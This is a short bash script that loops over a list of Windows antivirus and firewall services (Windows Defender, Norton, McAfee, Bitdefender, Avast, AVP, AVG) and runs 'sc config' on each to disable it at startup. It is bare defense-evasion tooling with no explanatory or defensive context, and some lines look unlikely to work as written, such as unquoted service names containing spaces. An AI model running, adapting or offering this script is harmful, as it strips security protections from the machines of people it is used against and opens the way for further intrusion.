#!/bin/bash

bash_path="C:\\Windows\\System32\\bash"
supported_av_services=("WinDefend" "Norton AntiVirus" "McAfeeFramework" "McShield" "Bitdefender Virus Shield"
"Avast Antivirus" "Avast Firewall" "AVP" "AVP Firewall" "AVG Antivirus" "AVG Firewall")
for av in "${supported_av_services[@]}"
do
  $bash_path -c "sc config $av start=disabled && exit"
done